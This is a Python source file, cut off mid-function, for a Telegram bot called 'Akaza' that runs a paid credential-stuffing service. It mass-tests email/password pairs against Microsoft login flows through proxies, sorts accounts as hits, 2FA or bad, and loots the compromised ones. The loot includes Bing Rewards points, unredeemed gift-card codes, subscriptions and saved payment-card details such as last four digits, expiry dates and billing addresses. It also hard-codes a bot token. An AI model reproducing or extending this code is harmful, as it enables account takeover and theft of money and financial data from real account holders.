import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3, imaplib, email as email_lib, socket
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import (Update, InlineKeyboardButton, InlineKeyboardMarkup)
from telegram.ext import (Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters)
# ============================================================================
# SECTION 2 — IMPORTS & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
# ============================================================================
# SECTION 3 — CONFIG CONSTANTS
# ============================================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500
# flux.py login URL — DO NOT CHANGE
SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)
# Global proxy list
PROXIES_LIST = []
# Global thread pool
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()
# Code patterns for extracting codes (flux.py)
CODE_PATTERNS = [
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 5-part
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',              # 4-part
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',                          # 3-part
]
# Exclusion list for codes (flux.py)
EXCLUDE_WORDS = {
    'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
    'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
    'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
    'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
    'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND',
    'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION',
    'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'
}
# ============================================================================
# SECTION 4 — AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path
    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            except Exception as e:
                logger.error(f"DB Error: {e}")
            finally: conn.close()
    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0, fast_mode INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS keys (
            key_code TEXT PRIMARY KEY, amount INTEGER)''')
        self.add_user(ADMIN_ID, "Admin", "Admin")
        self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))
    def add_user(self, uid, username, first_name):
        now = datetime.now().isoformat()
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)', (uid, username, first_name, now))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
    def is_banned(self, uid) -> bool:
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False
    def has_access(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            try:
                if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
            except: pass
        return True
    def is_mod(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False
    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))
    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))
    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))
    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
    def get_credits(self, uid) -> int:
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0
    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))
    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))
    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))
    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))
    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))
    def get_all_user_ids(self) -> list:
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []
    def get_user_info(self, uid) -> dict:
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}
    def get_user_settings(self, uid) -> dict:
        res = self._execute('SELECT keywords, threads, is_adding_kw, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw']), 'fast_mode': bool(res['fast_mode'])}
        return {'keywords': [], 'threads': 10, 'is_adding_kw': False, 'fast_mode': False}
    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None, fast_mode=None):
        if keywords is not None: self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None: self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if is_adding_kw is not None: self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))
        if fast_mode is not None: self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))
    def save_result(self, uid, email, status, details_dict):
        now = datetime.now().isoformat()
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details_dict), now))
        if status == 'hit': self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
    def user_stats(self, uid) -> dict:
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks': 0, 'hits': 0, 'credits': 0}
    def get_global_stats(self) -> dict:
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)
        a = self._execute('SELECT COUNT(*) as active FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)
        return {'total': t['total'] if t else 0, 'active': a['active'] if a else 0, 'checks': c['checks'] if c and c['checks'] else 0, 'hits': h['hits'] if h and h['hits'] else 0}
    def list_mods(self) -> list:
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []
    def create_key(self, amount: int) -> str:
        key_code = f"AKAZA-{str(uuid.uuid4()).split('-')[0].upper()}-{str(uuid.uuid4()).split('-')[1].upper()}"
        self._execute('INSERT INTO keys (key_code, amount) VALUES (?, ?)', (key_code, amount))
        return key_code
    def get_key_amount(self, key_code: str) -> int:
        res = self._execute('SELECT amount FROM keys WHERE key_code = ?', (key_code,), fetchone=True)
        return res['amount'] if res else 0
    def delete_key(self, key_code: str):
        self._execute('DELETE FROM keys WHERE key_code = ?', (key_code,))
akaza_db = AkazaDatabase(DB)
# ============================================================================
# SECTION 5 — TARGET DOMAINS & COMPANIES
# ============================================================================
TARGET_DOMAINS = {
    # Gaming - Domain Focus
    "@roblox.com": "Roblox",
    "@steampowered.com": "Steam",
    "@epicgames.com": "Epic Games",
    "@riotgames.com": "Riot Games",
    "@ubisoft.com": "Ubisoft",
    "@ea.com": "EA",
    "@blizzard.com": "Blizzard",
    "@id.supercell.com": "Supercell",
    "@txn-email.playstation.com": "PlayStation",
    "@sony.com": "Sony/PSN",
    "@minecraft.net": "Minecraft",
    "@mojang.com": "Mojang",
    "@xbox.com": "Xbox",
    "@microsoft.com": "Microsoft",
    # Streaming & Digital
    "@netflix.com": "Netflix",
    "@spotify.com": "Spotify",
    "@disneyplus.com": "Disney+",
    "@hulu.com": "Hulu",
    "@hbo.com": "HBO",
    "@amazon.com": "Amazon",
    "@apple.com": "Apple",
    "@account.tiktok.com": "TikTok",
    "@instagram.com": "Instagram",
    "@facebookmail.com": "Facebook",
}
# ============================================================================
# SECTION 6 — AkazaChecker CLASS (fully integrated: flux.py + hit.py + p7.py)
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = self.format_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })
    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        p = px.split(':')
        if len(p) == 4: return f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'
        return f'http://{px}' if len(p) == 2 else px
    # ── XBOX RPS LOGIN (flux.py exact) ─────────────────────────────────────
    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                           'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive'}
                text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
                ppft_m = (re.search(r'value=\\\"(.+?)\\\"', text, re.S) or
                          re.search(r'value="(.+?)"', text, re.S) or
                          re.search(r"sFTTag:'(.+?)'", text, re.S) or
                          re.search(r'sFTTag:"(.+?)"', text, re.S) or
                          re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
                if ppft_m:
                    ppft = ppft_m.group(1)
                    up_m = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
                            re.search(r"urlPost:'(.+?)'", text, re.S) or
                            re.search(r'urlPost:"(.+?)"', text, re.S) or
                            re.search(r'<form.*?action="(.+?)"', text, re.S))
                    if up_m: return up_m.group(1).replace('&amp;', '&'), ppft
            except: pass
            time.sleep(0.1)
        return None, None
    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                headers = {'Content-Type': 'application/x-www-form-urlencoded',
                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                           'Connection': 'close'}
                r = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=12, verify=False)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if tk and tk != 'None': return ('TOKEN', tk)
                elif 'cancel?mkt=' in r.text:
                    try:
                        ipt = re.search(r'name="ipt".*?value="(.+?)"', r.text).group(1)
                        pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
                        uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
                        act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
                        r2 = self.session.post(act, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True, timeout=10, verify=False)
                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"', r2.text).group(1)
                        r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
                        tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
                        if tk and tk != 'None': return ('TOKEN', tk)
                    except: pass
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=', 'help us protect']): 
                    return ('2FA', None)
                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist"]): 
                    return ('BAD', None)
                if 'too many times' in r.text.lower():
                    return ('ERROR', None)
            except: pass
        return ('ERROR', None)
    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF')
            if not form: break
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            action = form.get('action', '')
            if action.startswith('/'): action = 'https://login.live.com' + action
            try: resp = self.session.post(action, data=data, verify=False, timeout=10)
            except: break
        return resp
    # ── OUTLOOK OAUTH2 LOGIN (p7.py / hit.py exact) ────────────────────────
    def _outlook_login(self, email, password):
        """Login via Outlook OAuth2 — returns (access_token, cid) or (None, None)"""
        try:
            # IDP check (p7.py step 1)
            r1 = self.session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                         "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
                timeout=10, verify=False)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return None, None
            time.sleep(0.3)
            # OAuth2 authorize page (p7.py step 2)
            auth_url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                        "?client_info=1&haschrome=1"
                        f"&login_hint={quote(email)}"
                        "&mkt=en&response_type=code"
                        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
            r2 = self.session.get(auth_url,
                                  headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                                  timeout=15, verify=False)
            # Parse urlPost and PPFT (p7.py combined methods)
            um = re.search(r'"urlPost":"([^"]+)"', r2.text)
            if not um:
                # fallback raw split
                if '"urlPost":"' in r2.text:
                    um_raw = r2.text.split('"urlPost":"')[1].split('"')[0]
                    post_url = um_raw.replace('\\/', '/')
                else:
                    return None, None
            else:
                post_url = um.group(1).replace('\\/', '/')
            # PPFT: try multiple patterns (p7.py)
            ppft = None
            for ppft_pat in [
                r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"',
                r'name="PPFT" id="i0327" value="([^"]+)"',
                r'"sFTTag":".*?value=\\"([^"]+)\\"',
                r'name="PPFT".*?value="([^"]+)"',
            ]:
                m = re.search(ppft_pat, r2.text)
                if m: ppft = m.group(1); break
            if not ppft: return None, None
            # Submit credentials (p7.py step 3)
            login_data = (f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1"
                          f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
                          f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                          f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                          f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
                          f"&isRecoveryAttemptPost=0&i19=9960")
            r3 = self.session.post(post_url, data=login_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                            "Origin": "https://login.live.com"},
                                   allow_redirects=False, timeout=15, verify=False)
            resp_low = r3.text.lower()
            if any(x in resp_low for x in ["account or password is incorrect", "password is incorrect", "doesn't exist"]):
                return None, None
            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse", "help us protect", "recover?mkt"]):
                # Signal 2FA/Secure to avoid marking as BAD
                return "2FA", None
            if "too many times" in resp_low:
                return "RETRY", None
            # Extract auth code
            loc = r3.headers.get("Location", "")
            cm = re.search(r'code=([^&"\']+)', loc)
            if not cm:
                cm = re.search(r'code=([^&"\']+)', r3.text)
            if not cm: return None, None
            cid = ""
            for ck in self.session.cookies:
                if ck.name == "MSPCID": cid = ck.value.upper(); break
            if not cid: cid = self.session.cookies.get("MSPCID", "").upper()
            # Token exchange (p7.py step 4)
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": cm.group(1),
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "client_info": "1"
            }
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15, verify=False)
            if r4.status_code != 200 or "access_token" not in r4.text: return None, None
            tok = r4.json().get("access_token")
            return (tok, cid) if tok else (None, None)
        except Exception as e:
            logger.debug(f"Outlook login error {email}: {e}")
            return None, None
    # ── REWARDS POINTS (Optimized: Method 1, 2, 3) ──────────────────────────
    def get_rewards_points(self):
        """Optimized points fetching with session establishment"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Referer": "https://rewards.bing.com/"
            }
            # Step 0: Establish rewards session (fmHF handle)
            try:
                r_init = self.session.get("https://rewards.bing.com", headers=headers, timeout=10, verify=False)
                self.handle_fmhf(r_init)
            except: pass
            # Method 1: Primary Bing API
            try:
                r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers=headers, timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    pts = data.get('availablePoints') or data.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                    if pts is not None: return int(pts)
            except: pass
            # Method 2: Flyout API
            try:
                r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", headers=headers, timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if 'userInfo' in data and 'balance' in data['userInfo']: return int(data['userInfo']['balance'])
            except: pass
            # Method 3: Page scraping
            try:
                r = self.session.get("https://rewards.bing.com", headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    match = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
                    if match:
                        points = int(match.group(1))
                        if 0 <= points <= 500000: return points
            except: pass
        except: pass
        return 0
    # ── REDEMPTION CODES (flux.py full logic) ──────────────────────────────
    def get_redemption_codes(self):
        codes = []
        try:
            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory',
                                                   headers={'Referer': 'https://rewards.bing.com/'}, timeout=12, verify=False))
            soup = BeautifulSoup(r.text, 'html.parser')
            vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt_input.get('value', '') if vt_input else ''
            table = soup.find('table', class_='table')
            rows = []
            if table and table.find('tbody'): rows = table.find('tbody').find_all('tr')
            elif table: rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True)
                date  = cells[1].get_text(strip=True)
                cat   = self.detect_category(title, row.get_text(strip=True))
                btn   = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    try:
                        cr = self.session.post(act, data={'__RequestVerificationToken': vt},
                                               headers={'X-Requested-With': 'XMLHttpRequest',
                                                        'Content-Type': 'application/x-www-form-urlencoded'},
                                               timeout=12, verify=False).text
                    except: continue
                    csoup  = BeautifulSoup(cr, 'html.parser')
                    code_v = None
                    # a. resendSuccess tango div
                    rs = csoup.find('div', class_='resendSuccess')
                    if rs:
                        tk_divs = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                        tv_divs = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                        for k, v in zip(tk_divs, tv_divs):
                            kt = k.get_text(strip=True).upper()
                            if 'CODE' in kt or 'PIN' in kt:
                                cv = v.get_text(strip=True)
                                if cv and '*' not in cv: code_v = cv; break
                    # b. Multi-pattern code extraction
                    if not code_v:
                        for pat in CODE_PATTERNS:
                            m = re.search(pat, cr)
                            if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
                                code_v = m.group(); break
                    # c. PIN:/CODE: label
                    if not code_v:
                        m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}[A-Z0-9\-]{8,})', cr, re.I)
                        if m and '*' not in m.group(1): code_v = m.group(1)
                    # d. Clipboard button
                    if not code_v:
                        for cb in csoup.find_all('button', attrs={'data-clipboard-text': True}):
                            val = cb.get('data-clipboard-text', '').strip()
                            if val and len(val) >= 12 and '*' not in val: code_v = val; break
                    # e. pre/code tags
                    if not code_v:
                        for tag in csoup.find_all(['pre', 'code']):
                            txt = tag.get_text(strip=True)
                            for pat in CODE_PATTERNS:
                                if re.fullmatch(pat, txt) and '*' not in txt: code_v = txt; break
                            if code_v: break
                    # Redemption URL
                    ru = ''
                    for rp in [r"""<a[^>]*href=['"]([^'"]+)['"][^>]*>\s*Redemption URL\s*</a>""",
                                r'href="([^"]*redeem[^"]*)"', r'href="([^"]*claim[^"]*)"',
                                r'Redemption URL[:\s]+(https?://[^\s<>"]+)']:
                        rm = re.search(rp, cr, re.IGNORECASE)
                        if rm: ru = rm.group(1).strip(); break
                    if code_v:
                        codes.append({'code': code_v, 'category': cat, 'title': title, 'redemption_url': ru, 'date': date})
                else:
                    # No button — direct cell text
                    code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                    for pat in CODE_PATTERNS:
                        m = re.search(pat, code_text)
                        if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
                            codes.append({'code': m.group(), 'category': cat, 'title': title, 'redemption_url': '', 'date': date}); break
        except Exception as e:
            logger.debug(f"get_redemption_codes error: {e}")
        return codes
    def detect_category(self, title, row_text=''):
        t = (title + ' ' + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if 'sea of thieves' in t or 'ancient coins' in t: return 'Sea of Thieves'
        if 'roblox' in t or 'robux' in t: return 'Roblox'
        if 'league' in t or 'riot' in t or ' lol ' in t: return 'League of Legends'
        if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
        if 'minecraft' in t or 'minecoins' in t: return 'Minecraft'
        if any(x in t for x in ['gift card', 'giftcard', 'amazon', 'xbox', 'nintendo', 'playstation',
                                 'starbucks', 'walmart', 'subway', 'doordash', 'uber', 'target', 'spotify']): return 'Gift Card'
        if 'steam' in t: return 'Steam Gift Card'
        return 'Unknown'
    # ── MICROSOFT SUBSCRIPTIONS (hit.py enhanced) ──────────────────────────
    def get_microsoft_subs(self):
        try:
            uid = str(uuid.uuid4()).replace('-', '')[:16]
            u = (f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
                 f"&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                 f"&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                 f"&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none")
            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=12, verify=False)
            tk_m = re.search(r'access_token=([^&\s"\' ]+)', r.text + " " + r.url)
            if not tk_m: return {"status": "FREE", "subs": [], "balance": "", "card": "", "card_type": "", "last4": ""}
            tk = unquote(tk_m.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()),
                 "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            bal_raw = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
                                       headers=h, timeout=10, verify=False).text
            bal_m    = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_raw)
            card_m   = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_raw, re.S)
            ctype_m  = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', bal_raw)
            last4_m  = re.search(r'"lastFourDigits"\s*:\s*"([^"]+)"', bal_raw)
            expiry_m = re.search(r'"expiryDate"\s*:\s*"([^"]+)"', bal_raw)
            billing_m= re.search(r'"address1"\s*:\s*"([^"]+)"', bal_raw)
            country_m= re.search(r'"countryOrRegion"\s*:\s*"([^"]+)"', bal_raw)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                                  headers=h, timeout=10, verify=False).text
            subs = []
            sub_keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL',
                        'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
            for k, disp in sub_keys.items():
                if k in rt:
                    si = {'name': disp, 'is_expired': False}
                    rd_m = re.search(rf'"{re.escape(k)}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
                    if rd_m:
                        si['renewal_date'] = rd_m.group(1)
                        try:
                            rem = (datetime.fromisoformat(rd_m.group(1)) - datetime.now()).days
                            si['days_remaining'] = rem
                            if rem < 0: si['is_expired'] = True
                        except: pass
                    ar_m = re.search(r'"autoRenew"\s*:\s*(true|false)', rt)
                    if ar_m: si['auto_renew'] = 'YES' if ar_m.group(1) == 'true' else 'NO'
                    amt_m = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', rt)
                    if amt_m: si['amount'] = amt_m.group(1)
                    cur_m = re.search(r'"currency"\s*:\s*"([^"]+)"', rt)
                    if cur_m: si['currency'] = cur_m.group(1)
                    subs.append(si)
            card_info = {
                "card": card_m.group(1) if card_m else "",
                "card_type": ctype_m.group(1) if ctype_m else "",
